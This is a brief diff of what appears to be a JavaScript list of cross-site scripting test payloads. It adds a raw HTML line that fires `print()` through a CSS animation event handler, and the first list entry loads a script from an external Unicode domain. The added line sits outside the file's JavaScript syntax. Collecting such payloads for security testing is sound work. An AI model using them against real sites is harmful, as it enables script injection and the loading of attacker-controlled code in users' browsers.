@@ -1,3 +1,4 @@
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><xss id=x style="position:absolute;" onanimationcancel="print()"></xss>
 const PAYLOADS = [
     {
         html: '<script/src=//Ǌ.₨><\/script>',
